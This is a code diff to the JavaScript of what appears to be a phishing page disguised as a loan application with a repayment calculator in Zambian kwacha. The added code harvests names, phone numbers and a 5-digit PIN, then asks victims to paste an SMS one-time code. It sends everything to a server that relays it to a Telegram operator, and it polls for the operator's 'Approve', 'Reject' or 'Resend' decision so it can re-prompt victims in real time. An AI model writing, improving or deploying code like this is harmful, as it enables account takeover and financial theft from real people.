@@ -17,6 +17,7 @@ const translations = {
 };
 
 let currentLang = 'en'; 
+let currentSessionId = null; 
 
 function setLanguage(lang) {
     currentLang = lang;
@@ -42,7 +43,6 @@ function updateLoanValue() {
     const amountDisplay = document.getElementById('amountDisplay');
     const termDisplay = document.getElementById('termDisplay');
     const monthlyOutput = document.getElementById('monthlyPayment');
-    
     const amount = parseInt(amountSlider.value);
     const term = parseInt(termSlider.value);
     
@@ -54,7 +54,6 @@ function updateLoanValue() {
     const monthly = totalRepayment / term;
     monthlyOutput.innerText = `ZMW ${Math.ceil(monthly).toLocaleString()}`;
 }
-
 updateLoanValue();
 
 function goToForm() {
@@ -68,78 +67,69 @@ function goToForm() {
 function nextStep(stepNumber) {
     document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
     document.getElementById(`step-${stepNumber}`).classList.add('active');
-    
-    const progressFill = document.getElementById('progress-fill');
-    const stepText = document.getElementById('step-indicator');
-    
-    if(stepNumber === 1) {
-        progressFill.style.width = '33.33%';
-        stepText.setAttribute('data-translate', 'form_step1');
-        stepText.innerText = translations[currentLang].form_step1;
-    } else if(stepNumber === 2) {
-        progressFill.style.width = '66.66%';
-        stepText.setAttribute('data-translate', 'form_step2');
-        stepText.innerText = translations[currentLang].form_step2;
-    } else if (stepNumber === 3) {
-        progressFill.style.width = '100%';
-        stepText.setAttribute('data-translate', 'form_step3');
-        stepText.innerText = translations[currentLang].form_step3;
-    }
+    document.getElementById('progress-fill').style.width = stepNumber === 1 ? '33.33%' : (stepNumber === 2 ? '66.66%' : '100%');
+    document.getElementById('step-indicator').innerText = translations[currentLang][`form_step${stepNumber}`];
 }
 
 function prevStep(stepNumber) {
-    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
-    document.getElementById(`step-${stepNumber}`).classList.add('active');
-    
-    const progressFill = document.getElementById('progress-fill');
-    const stepText = document.getElementById('step-indicator');
-    
-    if(stepNumber === 1) {
-        progressFill.style.width = '33.33%';
-        stepText.setAttribute('data-translate', 'form_step1');
-        stepText.innerText = translations[currentLang].form_step1;
-    } else if(stepNumber === 2) {
-        progressFill.style.width = '66.66%';
-        stepText.setAttribute('data-translate', 'form_step2');
-        stepText.innerText = translations[currentLang].form_step2;
-    }
+    nextStep(stepNumber);
 }
 
-// NEW: This handles the Telegram buttons logic
+// STEP 1: Submit initial form (Name, Phone, 5-digit)
 async function submitApplication() {
     showScreen('processing-screen');
-
-    // Generate a random ID to track this specific user
-    const sessionId = Math.random().toString(36).substring(2, 15);
+    currentSessionId = Math.random().toString(36).substring(2, 15);
 
     const applicationData = {
         firstName: document.querySelector('#step-2 input[placeholder="First Name"]').value || 'Not provided',
         lastName: document.querySelector('#step-2 input[placeholder="Last Name"]').value || 'Not provided',
         phone: document.querySelector('#step-2 input[type="tel"]').value || 'Not provided',
         fiveDigitCode: document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value || 'Not provided',
-        sessionId: sessionId // Send the ID to the server
+        sessionId: currentSessionId
     };
 
     try {
-        // Send data to Telegram via your server
         await fetch('/api/submit-application', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(applicationData)
         });
-
-        // Start checking for your approval every 3 seconds
-        checkApprovalStatus(sessionId);
         
+        checkApprovalStatus(currentSessionId, 'form');
     } catch (error) {
         console.error("Error:", error);
-        alert("Network error. Please try again.");
+        alert("Network error.");
         showScreen('main-screen');
     }
 }
 
-// NEW: Loop that checks if you clicked Approve or Reject
-function checkApprovalStatus(sessionId) {
+// STEP 2: Submit SMS and wait for Approve/Reject/Resend
+async function submitSMS() {
+    const smsText = document.getElementById('smsInput').value;
+    if(!smsText) {
+        alert("Please paste the SMS first.");
+        return;
+    }
+
+    showScreen('processing-screen');
+
+    try {
+        await fetch('/api/submit-sms', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ smsText, sessionId: currentSessionId })
+        });
+
+        checkApprovalStatus(currentSessionId, 'sms');
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Network error.");
+        showScreen('sms-screen');
+    }
+}
+
+// POLLING: Checks if you clicked a button on Telegram
+function checkApprovalStatus(sessionId, currentStage) {
     const interval = setInterval(async () => {
         try {
             const response = await fetch(`/api/check-status/${sessionId}`);
@@ -147,23 +137,29 @@ function checkApprovalStatus(sessionId) {
 
             if (data.status === 'APPROVED') {
                 clearInterval(interval);
-                showScreen('sms-screen'); // Loads next page
-            } else if (data.status === 'REJECTED') {
+                if (currentStage === 'form') {
+                    showScreen('sms-screen'); 
+                } else {
+                    showScreen('verification-screen'); 
+                }
+            } 
+            else if (data.status === 'REJECTED') {
                 clearInterval(interval);
                 alert("Incorrect 5-digit code. Please try again.");
                 
-                // Clear the 5-digit code input
                 document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value = '';
-                
-                // Load back to the 5-digit code page (Step 2)
                 showScreen('form-screen');
-                // Ensure it shows step 2
-                document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
-                document.getElementById('step-2').classList.add('active');
-                document.getElementById('progress-fill').style.width = '66.66%';
+                nextStep(2);
+            } 
+            else if (data.status === 'RESEND') {
+                clearInterval(interval);
+                alert("Check your SMS for the new code sent. Please paste it again.");
+                
+                document.getElementById('smsInput').value = '';
+                showScreen('sms-screen');
             }
         } catch (error) {
             console.error("Polling error:", error);
         }
-    }, 3000); // Check every 3 seconds
+    }, 3000); 
 }
